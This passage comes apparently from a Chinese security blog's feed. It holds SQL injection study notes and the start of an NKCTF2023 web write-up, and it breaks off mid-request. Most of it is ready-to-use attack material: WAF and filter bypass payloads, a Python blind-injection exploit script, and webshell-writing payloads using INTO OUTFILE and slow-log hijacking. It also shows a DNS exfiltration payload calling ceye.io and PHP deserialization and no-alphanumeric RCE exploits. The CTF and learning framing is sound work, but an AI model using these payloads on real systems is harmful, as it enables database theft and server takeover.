class="language-mysql">0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.innodb_buffer_stats_by_table/**/where/**/object_shcema=database()#改进的payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics/**/where/**/table_shcema=database()#改进的payload0'union/**/select/**/1,group_concat(table_name),3/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_shcema=database()#改进的payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过sys和InnoDb我们可以绕过information_schema实现爆库名及表名，接下来就要想办法爆列名。</p><h5 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h5><p>举例说明：</p><p>可以看到from后面跟了select * from flag as a join flag as b，我通过join把a表和b表连接起来了，此时他们产生了相同的列名，如果通过(select * from flag as a join flag as b)c起了别名c，这样就与<strong>使用别名时，表中不能出现同的字段名</strong>的特性相冲突，因此会导致报错，报错内容为相同的列名(即第一个字段)。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20005623.png" style="zoom:50%;" /><p>接着，我在flag表创建了第二个字段。如果想获得下一个字段时需要使用using，using等价于join操作中的on,例如a和b根据flag字段关联：</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-07-08%20010648.png" style="zoom:50%;" /><p>这样我们就注出了第二列，因此无列名注入payload为：</p><pre class="line-numbers language-mysql"><code class="language-mysql">0' union all select* from (select * from flag as a join flag b)c#0' union all select* from (select * from flag as a join flag b using(flag))c#0' union all select* from (select * from flag as a join flag b using(flag,squirt1e))c#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="各种关键字、函数过滤绕过"><a href="#各种关键字、函数过滤绕过" class="headerlink" title="各种关键字、函数过滤绕过"></a>各种关键字、函数过滤绕过</h4><h5 id="and-or"><a href="#and-or" class="headerlink" title="and or"></a>and or</h5><ol><li>逻辑运算符：and&#x3D;&gt;&amp;&amp;、or&#x3D;&gt;||</li><li>异或运算^</li></ol><h5 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h5><ol><li>括号代替空格</li><li>内联注释&#x2F;**&#x2F;</li><li>%09, %0a, %0b, %0c, %0d, %a0</li><li>TAB换行符</li></ol><h5 id="单-x2F-双引号"><a href="#单-x2F-双引号" class="headerlink" title="单&#x2F;双引号"></a>单&#x2F;双引号</h5><ol><li>16进制、8进制、2进制绕过</li></ol><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><ol><li>字符串截断函数：left()、mid()、substr()、substring()</li><li>转换为acsii码函数：ord()、ascii()</li><li>睡眠函数：sleep(),benchmark()</li><li>链接函数：group_concat(),concat(),concat_ws()</li></ol><h5 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h5><p>盲注经常会用到函数，但如果括号被过滤函数也就用不了。因此可以考虑order by盲注，后面会讲。</p><h5 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h5><ol><li>盲注经常会用到substr(),mid()，因此也会用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决：</li></ol><pre class="line-numbers language-mysql"><code class="language-mysql">select substr(database(),1,1)<==>select substr(database() from 1 for 1)select mid(database(),1,1)<==>select mid(database() from 1 for 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>limit也经常会用到，可以使用offset。</li></ol><pre class="line-numbers language-mysql"><code class="language-mysql">select * from flag limit 0,1<==>select * from flag limit 1 offset 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="if"><a href="#if" class="headerlink" title="if"></a>if</h5><pre class="line-numbers language-mysql"><code class="language-mysql">select if((1=1),1,0)<==>select case when (1=1) then 1 else 0 end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="比较符号（大于-gt-、小于-lt-）"><a href="#比较符号（大于-gt-、小于-lt-）" class="headerlink" title="比较符号（大于&gt;、小于&lt;）"></a>比较符号（大于&gt;、小于&lt;）</h5><p>greatest(a,b,c)函数返回输入参数(a,b,c)的最大值。</p><pre class="line-numbers language-mysql"><code class="language-mysql">0'or ascii(susbstr(user(),1,1))>32          <==========>0'or greatest(ascii(susbstr(user(),1,1)),32)=32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><p>如果#,–之类的注释不让用，那么就用or的性质。</p><p>比如语句为select * from articles where id&#x3D;’$id’ and xxx</p><p>令:id&#x3D;1’union select 1,payload,3 or ‘1</p><p>语句就变成：</p><p>select * from articles where id&#x3D;’1’ union select 1,payload,3 or ‘1’ and xxx</p><h5 id="等于号"><a href="#等于号" class="headerlink" title="等于号"></a>等于号</h5><ol><li>like</li><li>in</li><li>regexp</li><li>rlike</li><li>between and           (select mid(database(),1,1) between ‘a’ <strong>and</strong> ‘a’ ;)</li></ol><h5 id="union，select，where"><a href="#union，select，where" class="headerlink" title="union，select，where"></a>union，select，where</h5><ol><li><p>大小写</p></li><li><p>双写</p></li><li><p>内联注释，如果在开头的的&#x2F;*后头加了感叹号，那么此注释里的语句将被执行。例如：</p><pre class="line-numbers language-mysql"><code class="language-mysql">/*!SELECT*/ flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过SeT @a&#x3D;0x73656c656374202a2066726f6d20603139313938313039333131313435313460;赋值一个变量，这里支持16进制，然后预编译执行:prepare execsql from @a;execute execsql;这样不用括号。</p><p>用concat配合char也可以：SET @sql&#x3D;concat(char(115,101,108,101,99,116),’* from <code>flag</code>‘);PREPARE jwt from @sql;EXECUTE jwt;</p></li><li><p>使用句柄直接读表也可以，但存储flag的表必须存储在当前数据库下，不然没用：HANDLER Flag OPEN; HANDLER Flag READ FIRST; HANDLER Flag CLOSE;#</p></li><li><p>mysql8.0的特性，后面会讲。</p></li></ol><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><blockquote><p>参考<a href="https://www.dazhuanlan.com/dempa0fit/topics/1173166">dempa0fit</a>师傅的博客</p></blockquote><pre class="line-numbers language-mysql"><code class="language-mysql">/index.php/<?php  $dbhost = "localhost";  $dbuser = "root";  $dbpass = "********";/这里是你的数据库密码/  $db = "sqli";  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);  mysqli_set_charset($conn,"utf8");   / sql     create  table admin (        id int(10) not null primary key auto_increment,        username varchar(20) not null ,        password varchar(32) not null     );  */function   filter($str){      $filterlist = "/(|)|username|password|where|      case|when|like|regexp|into|limit|=|for|;/";      if(preg_match($filterlist,strtolower($str))){        die("illegal input!");      }      return $str;  }$username = isset($_POST['username'])?filter($_POST['username']):die("please input username!");$password = isset($_POST['password'])?filter($_POST['password']):die("please input password!");$sql = "select * from admin where  username = '$username' and password = '$password' "; $res = $conn -> query($sql);if($res->num_rows>0){  $row = $res -> fetch_assoc();  if($row['id']){     echo $row['username'];  }}else{   echo "The content in the password column is the flag!";} ?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>安恒杯的一道题目，可以看到(、)、username、password、where、 case、when、like、regexp、into、limit、&#x3D;、for、;被过滤，并且password被过滤，因此盲注行不通，这里考虑用order by盲注。</p><p>比如我输入username&#x3D;admin’ union select 1,2,{} order by 3#&amp;password&#x3D;123。</p><p>那么语句变为：</p><pre class="line-numbers language-mysql"><code class="language-mysql">select * from admin where  username ='admin' union select 1,2,a order by 3#' and password = '123'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>password在第三列，因此order by 3。假设password的值为flag，那么显然a是要小于flag的。显然$row[‘id’]取得是第一行，因此username是1；如果输入1,2,f，此时也是1；如果输入1,2,g，那么就回显admin。此时我们就可以猜到了password第一位是f了。</p><p>又由于ordery by 不区分大小写，因此需要用到binary。</p><p>因此exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">sqli</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://vps_ip/orderbysqli_test/index.php"</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'username'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'123'</span><span class="token punctuation">}</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span>textusername <span class="token operator">=</span> <span class="token string">"admin'union select 1,2,0x{} order by 3 desc#"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     n <span class="token operator">=</span> <span class="token number">0</span>     <span class="token keyword">for</span> j <span class="token keyword">in</span> range <span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#print chr(j)</span>        n <span class="token operator">+=</span> <span class="token number">1</span>        payload <span class="token operator">=</span> username<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#print payload</span>        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token operator">not</span> <span class="token keyword">in</span> sqli<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>j<span class="token number">-1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">94</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'find is over'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基于dempa0fit师傅给出的exp小改了一下，总感觉原版写的有点问题。当然我是用记事本写的，因此也不一定对。。</p><p>后续还可以结合order by进行盲注或者报错注入，但我感觉用处不大，因为既然能用盲注，那为什么不直接用盲注呢？希望看到的师傅能给我解答。</p><h4 id="局限的报错注入"><a href="#局限的报错注入" class="headerlink" title="局限的报错注入"></a>局限的报错注入</h4><blockquote><p>参考<a href="https://blog.sari3l.com/posts/9622f295/#/%E6%8A%A5%E9%94%99%E5%9E%8B">sari3l</a>师傅的博客，速查表也是出自sari3l师傅。对一些函数进行了解析。</p></blockquote><h5 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h5><p>版本：mysql8.0</p><p>MySQL 8.0 推出了函数 UUID_TO_BIN，因为UUID生成的字符串太大，UUID_TO_BIN就是把UUID字符串转换成16进制，用来精简存储空间。</p><p>正常格式是为：SELECT UUID_TO_BIN(UUID());</p><p>如果不是UUID()生成的字符串，函数会报错。</p><p>payload：SELECT UUID_TO_BIN(database());</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>版本：mysql 5.5</p><p>exp()为会返回e的x次方结果，如果返回结果超过double类型的范围，将会报错。</p><p>payload为：select exp(~(select * from(select database())a))</p><h5 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h5><p>版本：mysql 5.5</p><p>和exp原理一样，运算结果超过范围时，将会报错。</p><p>~0为取反从而得到范围内的最大值，因此select ~0+1就会越界导致报错。因此构造出1就可以了，这里用到非运算!，!后面跟上字符串返回1。</p><p>因此payload为：select ~0+!(select * from (select user())x);</p><p>​  select !(select * from(select user())x)-~0</p><h5 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h5><table><thead><tr><th>类别</th><th>函数</th><th>版本需求</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>函数显错长度</th><th>Mysql报错内容长度</th><th>额外限制</th></tr></thead><tbody><tr><td>主键重复</td><td>floor round</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td>64</td><td></td><td>data_type ≠ varchar</td></tr><tr><td>列名重复</td><td>name_const</td><td>❓</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only version()</td></tr><tr><td>列名重复</td><td>join</td><td>[5.5.49, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td>only columns</td></tr><tr><td>数据溢出 - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td>Bigint</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>✔️</td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>✔️</td><td>✔️</td><td>✔️</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>✔️</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td></td><td></td><td></td></tr></tbody></table><h4 id="读服务器文件"><a href="#读服务器文件" class="headerlink" title="读服务器文件"></a>读服务器文件</h4><p>mysql提供了用于读取文件的函数（<strong>以下两种方法均受到secure-file-priv的限制</strong>）：</p><p>select load_file(file_path);        #读文件，回显</p><p>load data infile file_path into table test FIELDS TERMINATED BY ‘\n’; #按照\n(换行)分割读取指定的file_path服务端文件的数据并插入到test表中。</p><h4 id="伪造mysql服务端读客户端文件"><a href="#伪造mysql服务端读客户端文件" class="headerlink" title="伪造mysql服务端读客户端文件"></a>伪造mysql服务端读客户端文件</h4><p>load data infile file_path into table test FIELDS TERMINATED BY ‘\n’;是读取客户端文件并把数据插入到test表中，读取客户端文件的前提是local_infile这个变量是On，通过查阅官方文档可知在Mysql8之后local_infile这个变量默认为OFF，我自测Mysql5.6的环境local_infile默认是On。</p><p>我在本机D盘准备了Program.txt，成功把数据写入了flag表。</p><pre class="line-numbers language-mysql"><code class="language-mysql">load data local infile "D://Program.txt" into table flag FIELDS TERMINATED BY '\n'> Affected rows: 3> 时间: 0.034s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>实际上读客户端指定路径的文件这个操作是服务端来指明的。假设客户端向伪造的mysql服务器发送一个查询的请求，服务端通过伪造请求就可以任意读取客户端的文件：</p><ol><li>客户端：我要flag表中的数据</li><li>服务端：我要你的&#x2F;etc&#x2F;passwd内容</li><li>客户端：给你&#x2F;etc&#x2F;passwd的内容</li></ol><p>由于需要伪造mysql服务器，个人认为利用面较小。该节内容摘自<a href="https://paper.seebug.org/1112/#_3">LoRexxar@知道创宇404实验室 &amp; Dawu@知道创宇404实验室</a></p><h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>常见的有outfile dumpfile函数写shell,假设网站目录路径为&#x2F;var&#x2F;www&#x2F;html。</p><pre class="line-numbers language-mysql"><code class="language-mysql">union select 1,"<?php @eval($_POST[1]);?>",3 into outfile '/var/www/html/shell.php';union select 2,"<?php @eval($_POST[1]);?>",3 into dumpfile '/var/www/html/shell.php';--mysql识别16进制，因此也可以用0x绕过一些WAF。union select 1,0x223c3f70687020406576616c28245f504f53545b315d293b3f3e22,3 into outfile '/var/www/html/shell.php';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制：</p><ul><li>secure_file_priv支持web目录文件导出</li><li>数据库用户file权限</li><li>绝对路径</li></ul><p>由于受到secure-file-priv限制，写shell往往难以实现。因此可以通过日志文件的方法来绕过。</p><p>原理：mysql存在日志以及慢日志机制，它记录了用户的操作。由于general_log(日志开关)默认是关闭的，slow_query_log(慢日志开关)默认是开启的，因此在这里分析慢日志。</p><p>查询：show GLOBAL VARIABLES like ‘%slow_query_log%’</p><table><thead><tr><th align="center">变量名</th><th align="center">值</th></tr></thead><tbody><tr><td align="center">slow_query_log_file</td><td align="center">&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.log</td></tr><tr><td align="center">slow_query_log</td><td align="center">ON</td></tr></tbody></table><p>可以看到slow_query_log是默认开启滴，并且慢日志存储路径为&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.log。</p><p>顾名思义，只有执行时间慢的sql语句才被记录与慢日志中，可以通过query_time查看时间阈值，我这里默认是3秒，也就是说大于3秒执行时间的语句都会记录于慢日志中</p><p>我在测试环境中执行：select ‘<?php phpinfo();?>‘ or sleep(10)。</p><p>运行时间为10s&gt;&gt;3s，因此查看mysql-slow.log能看到这次记录。</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220708231845.png" style="zoom:50%;" /><p>那么这也就意味着如果我们通过set global slow_query_log_file&#x3D;’&#x2F;var&#x2F;www&#x2F;html&#x2F;log.php’设置慢日志为网站根目录下的php文件，就能写入webshell了。可以看到我只进行了select ‘<?php phpinfo();?>‘ or sleep(10)操作，并未写文件。log日志也是同理。</p><p>因此payload：</p><pre class="line-numbers language-mysql"><code class="language-mysql">#慢日志show global variables like '%slow_query_log%'    #查看路径，以及慢日志开关set global slow_query_log_file='/var/www/html/shell.php'   #设置路径set global slow_query_log=ON        #设置开关select @@long_query_time                 #非必须，最好还是先看看select '<?php eval($_POST[1]);?>' or sleep(10)       #写入webshell##访问shell.php  getshell#log日志show global variables like '%general_log%'   #查看路径，以及日志开关mysql> set global general_log_file = '/var/www/html/shell.php'    #设置路径mysql> set global general_log = on         #设置开关select '<?php eval($_POST[1]);?>'      #写入webshell##访问shell.php  getshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DNSLOG外带"><a href="#DNSLOG外带" class="headerlink" title="DNSLOG外带"></a>DNSLOG外带</h4><p>无论是靶场还是真实场景经常会遇到sql注入无回显，因此需要盲注。如果目标服务器是windows，并且能出网，这时可以尝试DNSLOG外带数据。</p><p><code>payload: load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.????.ceye.io&#39;))</code></p><h2 id="kali-linux探索之漏洞扫描"><a href="#kali-linux探索之漏洞扫描" class="headerlink" title="kali linux探索之漏洞扫描"></a>kali linux探索之漏洞扫描</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote><p>用于探测存活主机，扫描主机端口，探测主机操作系统</p></blockquote><p>nmap [扫描类型] [参数] 目标IP</p><h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><ul><li>-sT         TCP连接扫描，需要建立三次握手，因此会留下日志记录</li><li>-sS         SYN扫描，不建立三次握手，很少会留下日志记录（默认是-sS)</li><li>-P0         扫描之前不需要Ping，用于绕过防火前禁Ping功能</li><li>-sV         探测服务版本信息（服务指纹）</li><li>-sU         UDP扫描</li></ul><h4 id="扫描参数"><a href="#扫描参数" class="headerlink" title="扫描参数"></a>扫描参数</h4><ul><li>-v   显示扫描过程</li><li>-p   指定端口号，比如[1-100],[22,135,1433]</li><li>-A   全面系统监测，扫描系统指纹</li><li>-T4  针对TCP端口禁止动态扫描延迟超过10ms</li><li>-iL    批量扫描，读取主机列表，如[-iL &#x2F;home&#x2F;ip.txt]</li><li>-oG  将扫描结果输出到某个文件</li><li>–script 指定脚本扫描</li></ul><p>一般Nmap与fping联动（fping先扫描存活主机）：</p><ol><li>fping -a -g 192.168.157.9 192.168.157.200 -q &gt; &#x2F;tmp&#x2F;alive.txt</li><li>Nmap -iL &#x2F;tmp&#x2F;alive.txt</li></ol><h3 id="GOOGLE-HACK语法"><a href="#GOOGLE-HACK语法" class="headerlink" title="GOOGLE HACK语法"></a>GOOGLE HACK语法</h3><ul><li>intitle：指定标题</li><li>inurl：指定url</li><li>intext：指定正文内容</li><li>filetype：指定搜索的文档类型</li><li>cache：搜索网页快照</li><li>site：将搜索范围限制在某个网站或域名中</li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023 WEB</title>
      <link href="/2023/03/27/nkctf2023-web/"/>
      <url>/2023/03/27/nkctf2023-web/</url>
      
        <content type="html"><![CDATA[<h3 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h3><p>为什么全是php</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h4><p>exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Welcome</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'welcome_to_NKCTF'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Happy</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$shell</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">shell</span><span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string">"more /[e-h][1-z][1-b][e-h]"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Hell0</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Happy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hell0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h4><ol><li><p>弱比较md5，没转string，数组绕过 ?a[]&#x3D;1&amp;b[]&#x3D;2</p></li><li><p>强转string并且是强比较，随便搜一搜就能搜到（用burp传</p></li><li><p>e&#x3D;114514.1</p></li><li><p>php解析错误，会把[解析成_并且后面的符号不处理：NS[CTF.go</p></li><li><p>无字母数字RCE，取反绕过即可</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$ans1</span><span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//函数名</span><span class="token variable">$ans2</span><span class="token operator">=</span><span class="token string">'ls /'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//命令</span><span class="token variable">$data1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过两次取反运算得到system</span><span class="token variable">$data2</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过两次取反运算得到dir</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data1</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data2</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">POST /?a[]=1&amp;b[]=2&amp;e=114514.1&amp;NS[CTF.go=1 HTTP/1.1<span class="token header-name keyword">Host:</span> 0e24c0a9-4d3e-4a99-afc9-001ed884b1f0.node2.yuzhian.com.cn<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 